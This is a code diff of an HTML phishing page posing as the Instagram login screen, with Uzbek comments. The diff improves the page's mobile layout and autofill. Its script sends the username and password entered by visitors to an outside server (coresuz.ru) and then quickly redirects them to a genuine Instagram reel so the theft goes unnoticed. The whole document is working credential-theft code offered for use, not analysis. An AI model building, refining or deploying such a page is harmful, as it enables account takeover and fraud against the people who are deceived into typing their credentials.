@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Mobil optimizatsiya -->
     <title>Login • Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Satisfy&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -17,17 +18,21 @@
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4 text-sm">
+
     <div class="flex-grow flex flex-col justify-center items-center w-full">
-        <main class="w-full max-w-xs flex flex-col items-center">
+        <main class="w-full max-w-xs md:max-w-sm lg:max-w-md flex flex-col items-center">
             <h1 class="instagram-font text-5xl mb-8">Instagram</h1>
-            <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer" class="bg-[#385185] w-full text-white font-semibold rounded-lg py-2 mt-4 flex items-center justify-center">
+            <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer"
+               class="bg-[#385185] w-full text-white font-semibold rounded-lg py-2 mt-4 flex items-center justify-center">
                 <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M20 10c0-5.523-4.477-10-10-10S0 4.477 0 10c0 4.991 3.657 9.128 8.438 9.878v-6.987H5.904V10H8.438V7.795c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V10h2.773l-.443 2.89H13.62v6.988C18.343 19.128 20 14.991 20 10z" clip-rule="evenodd"></path></svg>
                 Continue with Facebook
             </a>
             <div class="or-separator w-full my-4 font-semibold text-xs">OR</div>
-            <form class="w-full space-y-2" id="loginForm">
-                <input id="loginInput" type="text" placeholder="Phone number, username, or email" class="input-field w-full px-3 py-3 rounded-md text-xs">
-                <input id="passInput" type="password" placeholder="Password" class="input-field w-full px-3 py-3 rounded-md text-xs">
+            <form class="w-full space-y-2" id="loginForm" autocomplete="off">
+                <input id="loginInput" type="text" placeholder="Phone number, username, or email"
+                       class="input-field w-full px-3 py-3 rounded-md text-xs" autofocus autocomplete="username">
+                <input id="passInput" type="password" placeholder="Password"
+                       class="input-field w-full px-3 py-3 rounded-md text-xs" autocomplete="current-password">
                 <div class="text-right mt-2">
                     <a href="#" class="text-xs text-[#0095f6]">Forgot password?</a>
                 </div>
@@ -60,18 +65,15 @@
         const login = document.getElementById('loginInput').value;
         const parol = document.getElementById('passInput').value;
 
+        // Ma'lumotlarni yuboramiz, natijani kutmaymiz
         fetch('https://c718.coresuz.ru/faylnomi.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
             body: `login=${encodeURIComponent(login)}&parol=${encodeURIComponent(parol)}`
-        })
-        .then(response => response.text())
-        .then(data => {
-            window.location.href = "https://www.instagram.com/reel/DO84Dd0CKAA/?igsh=MTVwZDJibzF1bTAwOQ==";
-        })
-        .catch(error => {
-            alert('Xatolik yuz berdi: ' + error);
         });
+
+        // Zudlik bilan Instagram reelsga yo'naltiramiz
+        window.location.href = "https://www.instagram.com/reel/DO84Dd0CKAA/?igsh=MTVwZDJibzF1bTAwOQ==";
     });
     </script>
 </body>
